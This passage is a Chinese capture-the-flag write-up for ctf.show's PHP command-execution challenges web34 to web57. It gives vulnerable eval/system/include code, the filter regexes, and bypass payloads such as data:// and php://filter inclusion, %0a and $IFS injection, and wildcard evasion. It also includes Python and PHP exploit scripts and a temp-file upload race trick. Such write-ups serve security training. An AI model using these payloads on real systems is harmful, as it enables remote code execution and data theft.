|'|`|echo|;|(|\u0026quot;\n继续使用include构造payload：\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb34 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:29 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽的关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\u0026quot;\n继续使用include构造payload：\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb35 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 04:21:23 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;|\\\u0026lt;|\\=/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\u0026quot;|\u0026lt;|=\n继续使用include构造payload：（wsm还能秒）\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[1]?\u0026gt;\u0026amp;1=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb36 1\u0026lt;?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-04 00:12:34 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-04 04:21:16 9\\# @email: h1xa@ctfer.com 10\\# @link: https://ctfer.com 11*/ 12 13error_reporting(0); 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;|\\\u0026lt;|\\=|\\/|[0-9]/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键字 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|\u0026quot;|\u0026lt;|=|/|[0-9]\n不是哥们，数字也要屏蔽，那我改一下不就好了\n继续使用include构造payload：\nurl/?c=include$_GET[m]?\u0026gt;\u0026amp;m=php://filter/convert.base64-encode/resource=flag.php\n或者\nurl/?c=include$_GET[m]?\u0026gt;\u0026amp;m=data://text/plain,\u003c?php%20system(\"tac%20flag.php\")?\u003e\nweb37 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:18:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} 不是哥们，怎么还是文件包含\npayload：\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\n或者\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb38 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 05:23:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag|php|file/i\u0026#34;, $c)){ 18 include($c); 19 echo $flag; 20 21 } 22 23}else{ 24 highlight_file(__FILE__); 25} payload:\n?c=data://text/plain,\u003c?=system(\"tac%20fla*\")?\u003e\n或者\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\nweb39 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:13:21 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13//flag in flag.php 14error_reporting(0); 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c = $_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ 18 include($c.\u0026#34;.php\u0026#34;); 19 } 20 21}else{ 22 highlight_file(__FILE__); 23} 这里会在我们传入的c后面拼接一段.php\n我们只需要在加入\u003c?php ?\u003e那么php就只会执行中间的代码，后面的内容不会执行\n故payload：\n?c=data://text/plain,\u003c?php system(\"tac fla*.php\")?\u003e\nweb40 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-04 00:12:34 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-04 06:03:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13 14if(isset($_GET[\u0026#39;c\u0026#39;])){ 15 $c = $_GET[\u0026#39;c\u0026#39;]; 16 if(!preg_match(\u0026#34;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\\u0026#39;|\\\u0026#34;|\\,|\\\u0026lt;|\\.|\\\u0026gt;|\\/|\\?|\\\\\\\\/i\u0026#34;, $c)){ 17 eval($c); 18 } 19 20}else{ 21 highlight_file(__FILE__); 22} 屏蔽关键词 /[0-9]|~|`|@|#|\\$|%|^|\u0026amp;|*|\\（|\\）|-|=|+|{|[|]|}|:|'|\u0026quot;|,|\u0026lt;|.|\u0026gt;|/|?|\\\\\n这里要使用无参命令执行\npayload：\n?c=show_source(next(array_reverse(scandir(pos(localeconv())))));\n关于无参命令执行的一些解释\nweb41 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: 羽 6# @Date: 2020-09-05 20:31:22 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:40:07 9# @email: 1341963450@qq.com 10# @link: https://ctf.show 11 12*/ 13 14if(isset($_POST[\u0026#39;c\u0026#39;])){ 15 $c = $_POST[\u0026#39;c\u0026#39;]; 16if(!preg_match(\u0026#39;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\u0026#39;, $c)){ 17 eval(\u0026#34;echo($c);\u0026#34;); 18 } 19}else{ 20 highlight_file(__FILE__); 21} 22?\u0026gt; 过滤内容：/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\n这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。 我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。\n大佬的脚本\n1\u0026lt;?php 2$myfile = fopen(\u0026#34;rce_or.txt\u0026#34;, \u0026#34;w\u0026#34;); 3$contents=\u0026#34;\u0026#34;; 4for ($i=0; $i \u0026lt; 256; $i++) { 5\tfor ($j=0; $j \u0026lt;256 ; $j++) { 6 7\tif($i\u0026lt;16){ 8\t$hex_i=\u0026#39;0\u0026#39;.dechex($i); 9\t} 10\telse{ 11\t$hex_i=dechex($i); 12\t} 13\tif($j\u0026lt;16){ 14\t$hex_j=\u0026#39;0\u0026#39;.dechex($j); 15\t} 16\telse{ 17\t$hex_j=dechex($j); 18\t} 19\t$preg = \u0026#39;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\u0026#39;; 20\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ 21\techo \u0026#34;\u0026#34;; 22 } 23 24\telse{ 25\t$a=\u0026#39;%\u0026#39;.$hex_i; 26\t$b=\u0026#39;%\u0026#39;.$hex_j; 27\t$c=(urldecode($a)|urldecode($b)); 28\tif (ord($c)\u0026gt;=32\u0026amp;ord($c)\u0026lt;=126) { 29\t$contents=$contents.$c.\u0026#34; \u0026#34;.$a.\u0026#34; \u0026#34;.$b.\u0026#34;\\n\u0026#34;; 30\t} 31\t} 32 33} 34} 35fwrite($myfile,$contents); 36fclose($myfile); 1# -*- coding: utf-8 -*- 2import requests 3import urllib 4from sys import * 5import os 6os.system(\u0026#34;php rce_or.php\u0026#34;) #没有将php写入环境变量需手动运行 7if(len(argv)!=2): 8 print(\u0026#34;=\u0026#34;*50) 9 print(\u0026#39;USER：python exp.py \u0026lt;url\u0026gt;\u0026#39;) 10 print(\u0026#34;eg： python exp.py http://ctf.show/\u0026#34;) 11 print(\u0026#34;=\u0026#34;*50) 12 exit(0) 13url=argv[1] 14def action(arg): 15 s1=\u0026#34;\u0026#34; 16 s2=\u0026#34;\u0026#34; 17 for i in arg: 18 f=open(\u0026#34;rce_or.txt\u0026#34;,\u0026#34;r\u0026#34;) 19 while True: 20 t=f.readline() 21 if t==\u0026#34;\u0026#34;: 22 break 23 if t[0]==i: 24 #print(i) 25 s1+=t[2:5] 26 s2+=t[6:9] 27 break 28 f.close() 29 output=\u0026#34;(\\\u0026#34;\u0026#34;+s1+\u0026#34;\\\u0026#34;|\\\u0026#34;\u0026#34;+s2+\u0026#34;\\\u0026#34;)\u0026#34; 30 return(output) 31 32while True: 33 param=action(input(\u0026#34;\\n[+] your function：\u0026#34;) )+action(input(\u0026#34;[+] your command：\u0026#34;)) 34 data={ 35 \u0026#39;c\u0026#39;:urllib.parse.unquote(param) 36 } 37 r=requests.post(url,data=data) 38 print(\u0026#34;\\n[*] result:\\n\u0026#34;+r.text) 将两个文件放在同一个文件夹，运行exp.py即可\n羽师傅nb\n注意链接要用http不能用https\nweb42 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 20:51:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 18}else{ 19 highlight_file(__FILE__); 20} 这道题会将我们输入的命令与\u0026quot; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026quot;进行拼接\n/dev/null 2\u0026gt;\u0026amp;1 意思是将标准输出和标准错误都重定向到 /dev/null 即不回显\n导致我们无法成功执行\n我们可以通过%0a截断的方式绕过\ntac fl*%0a\nor\n; //分号 | //只执行后面那条命令 || //只执行前面那条命令 \u0026amp; //两条命令都会执行 \u0026amp;\u0026amp; //两条命令都会执行\n过滤了分号和cat，可以用||和\u0026amp;来代替分号，tac代替cat\n可构造playload: url/?c=tac flag.php|| url/?c=tac flag.php%26 注意，这里的\u0026amp;需要url编码\nweb43 过滤了cat、；，\n不是很影响\ntac fl*%0a\ror\rtac flag.php||\r...\r//记得转url编码 web44 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:32:01 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/;|cat|flag/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了;|cat|flag\n小问题\ntac fl*%0a\ror\rtac f*||\r...\r//记得转url编码 web45 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:35:34 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| /i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了;|cat|flag和空格\n可以用%09或$IFS$9代替空格\ntac%09fl*%0a\ror\rtac%09f*||\ror\recho$IFS`tac$IFS*`%0A\r...\r//记得转url编码 web46 \u0026lt;?php\r/*\r# -*- coding: utf-8 -*-\r# @Author: h1xa\r# @Date: 2020-09-05 20:49:30\r# @Last Modified by: h1xa\r# @Last Modified time: 2020-09-05 21:50:19\r# @email: h1xa@ctfer.com\r# @link: https://ctfer.com\r*/\rif(isset($_GET[\u0026#39;c\u0026#39;])){\r$c=$_GET[\u0026#39;c\u0026#39;];\rif(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\u0026#34;, $c)){\rsystem($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;);\r}\r}else{\rhighlight_file(__FILE__);\r} 过滤有点多啊\n;|cat|flag| |[0-9]|\\$|*\n但是事实上我们上题使用的方法并不会受到影响，因为%09是url编码，不会被当成数字过滤\ntac%09fl*%0a\ror\rtac%09f*||\ror\rtac\u0026lt;f*||\r//记得转url编码 web47 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:59:23 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤这么多O.o？\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail\n但是幸好我用的是tac\ntac%09fl*%0a\ror\rtac%09f*||\ror\rtac\u0026lt;f*||\r//记得转url编码 web48 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:06:20 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤更多了\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`\ntac%09fl??.php%0a\ror\rtac%09fl??.php%7c%7c //记得转url编码 web49 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:22:43 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%\n虽然过滤了%但是是不影响我们传入的url编码的\ntac%09fl??.php%0a\ror\rtac%09fl??.php%7c%7c web50 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:32:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%|\\x09|\\x26\n坏，没法用%09代替空格，没法用?代替字符\n不过幸好还有\u0026lt;和\u0026rsquo;'\ntac\u0026lt;fla%27%27g.php||\ror\rtac\u0026lt;fla%27%27g.php%0a web51 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:42:52 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\\x09|\\x26/\n怎么把我tac也过滤了\n没事能绕过\nt%27%27ac\u0026lt;fla%27%27g.php||\ror\rt%27%27ac\u0026lt;fla%27%27g.php%0a web51 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:50:30 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n;|cat|flag| |[0-9]|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\\x09|\\x26|\u0026gt;|\u0026lt;\n我测怎么连\u0026lt; \u0026gt;都要过滤\n别忘了还可以用$IFS\nca%27%27t$IFS/fla%27%27g||\ror\rca%27%27t$IFS/fla%27%27g%0a web52 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 18:21:02 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 echo($c); 19 $d = system($c); 20 echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$d; 21 }else{ 22 echo \u0026#39;no\u0026#39;; 23 } 24}else{ 25 highlight_file(__FILE__); 26} 过滤了\n;|cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\\x09|\\x26|\u0026gt;|\u0026lt;/\n这题没有在后面进行命令拼接，其他和上一题一样\nc%27%27at${IFS}fla%27%27g.php web54 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 19:43:42 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 这题过滤了很多命令,题目通过*使得只要是传入的内容出现如cat三个字符即可被匹配到，无法使用之前的字符拼接方法绕过\n这题没过率通配符?\n解一\n/bin/?at${IFS}f??????? cat命令所在的路径是在/bin/目录下，所以这里相当于直接调用了cat文件执行命令，这里的cat可以看作命令，也是一个文件，所以通配符可以用在这上面（一开始还傻傻的换成uniq看能不能用hhh）。\nbin下的命令：Linux /bin 目录下命令简要说明 - 崔旗 - 博客园\n同理bin目录下还存在more，所以这里的cat我们换成more也可以读取flag。 解二\nvi${IFS}fla?.php or\rc=uniq${IFS}f???.php //倒序的\ror\rgrep${IFS}%27fla%27${IFS}f???????%0a web55 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 20:03:51 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了\n\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/ 这题涉及到一个知识点\n也就是无字母数字的命令执行\nhttps://blog.csdn.net/qq_46091464/article/details/108513145\nhttps://blog.csdn.net/qq_46091464/article/details/108557067\n无字母数字webshell之提高篇 | 离别歌\n思路\nshell下可以利用.来执行任意脚本 Linux文件名支持用glob通配符代替 我们可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在/tmp/php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）\n注意：通过`.`去执行sh命令不需要有执行权限 1.构造post数据包\n1\u0026lt;!DOCTYPE html\u0026gt; 2\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 3\u0026lt;head\u0026gt; 4 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 5 \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; 6 \u0026lt;title\u0026gt;POST数据包POC\u0026lt;/title\u0026gt; 7\u0026lt;/head\u0026gt; 8\u0026lt;body\u0026gt; 9\u0026lt;form action=\u0026#34;http://f3a86e62-7402-4d1d-b950-0d6da4aa4eab.challenge.ctf.show/\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; 10\u0026lt;!--链接是当前打开的题目链接--\u0026gt; 11 \u0026lt;label for=\u0026#34;file\u0026#34;\u0026gt;文件名：\u0026lt;/label\u0026gt; 12 \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34;\u0026gt;\u0026lt;br\u0026gt; 13 \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;提交\u0026#34;\u0026gt; 14\u0026lt;/form\u0026gt; 15\u0026lt;/body\u0026gt; 16\u0026lt;/html\u0026gt; 在上传的文件里面写入sh指令\n1#!/bin/sh 2ls 2.抓包\n3.构造执行sh命令的poc\n详细解释poc的构造：\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob\n我们这里可以理解为我们这道题里面的干扰文件名都是由小写字母组成的，所有文件名都是小写，只有PHP生成的临时文件包含大写字母，那我们就可以构造出如下的poc\n?c=.+/???/????????[@-[] 注：后面的[@-[]是linux下面的匹配符，是进行匹配的大写字母。 我们就来吧\n修改一下指令内容即可得到flag\nweb56 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// 你们在炫技吗？ 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\{|\\\u0026#39;|\\\u0026#34;|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c); 19 } 20}else{ 21 highlight_file(__FILE__); 22} ;|[a-z]|[0-9]|\\$|(|{|'|\u0026quot;|`|%|\\x09|\\x26|\u0026gt;|\u0026lt;\n这题相比上一题多过滤了一个数字，不影响我们上题的解题方法\n这里不再赘述\n放个大佬的脚本\n1import requests 2 3while True: 4\turl = \u0026#34;http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]\u0026#34; 5\tr = requests.post(url, files={\u0026#34;file\u0026#34;: (\u0026#39;feng.txt\u0026#39;, b\u0026#39;cat flag.php\u0026#39;)}) 6\tif r.text.find(\u0026#34;flag\u0026#34;) \u0026gt; 0: 7\tprint(r.text) 8\tbreak web57 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-08 01:02:56 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13// 还能炫的动吗？ 14//flag in 36.php 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\\u0026#39;|\\\u0026#34;|\\`|\\%|\\x09|\\x26|\\x0a|\\\u0026gt;|\\\u0026lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\u0026#34;, $c)){ 18 system(\u0026#34;cat \u0026#34;.$c.\u0026#34;.php\u0026#34;); 19 } 20}else{ 21 